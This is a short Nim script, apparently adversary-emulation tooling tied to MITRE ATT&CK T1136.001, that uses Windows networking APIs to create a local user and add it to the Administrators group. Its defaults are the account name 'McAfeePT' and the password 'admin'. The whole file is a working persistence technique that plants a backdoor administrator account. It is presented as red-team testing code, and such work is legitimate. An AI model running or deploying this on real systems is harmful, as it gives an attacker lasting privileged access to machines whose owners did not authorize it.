#[
    Script to create a local admin account.
    TTP: https://attack.mitre.org/techniques/T1136/001/

    Usage:
        registryRunFolder.exe [accountname] [password]
    Default:
        Accountname: McAfeePT
        Password: admin
]#
import os
import strformat
import winim
import winim/inc/lm

#import std/times

var
    userlevel:DWORD = 1
    UserInfos:USER_INFO_1
    dwError:DWORD = 0
    account:LOCALGROUP_MEMBERS_INFO_3
    groupname: string = "Administrators"

proc createLocaLAdmin(username: string, password: string) =
    echo fmt"[+] Creating the user {username}"

    UserInfos.usri1_name = L(username)
    UserInfos.usri1_password = L(password)
    UserInfos.usri1_priv = USER_PRIV_USER
    UserInfos.usri1_flags = UF_SCRIPT
    UserInfos.usri1_home_dir = NULL
    UserInfos.usri1_comment = NULL
    UserInfos.usri1_script_path = NULL

    let user = NetUserAdd(NULL, userlevel, cast [LPBYTE](&UserInfos), cast [ptr DWORD](dwError))
    if user != NERR_Success:
        echo fmt"[-] Cannot create the user {username}"
    else:
        echo fmt"[+] Created {username}"

    account.lgrmi3_domainandname = UserInfos.usri1_name

    let isAdmin = NetLocalGroupAddMembers(NULL, L(groupname), 3, cast [LPBYTE](&account), 1)

    if isAdmin != NERR_Success:
        echo isAdmin
        echo fmt"[-] Cannot level the user {username} to an local admin"
    else:
        echo fmt"[+] The {username} is now in admins group"


if isMainModule:
  if paramCount() > 0:
      createLocaLAdmin(paramStr(1), paramStr(2))
  else:
      createLocaLAdmin("McAfeePT", "admin")
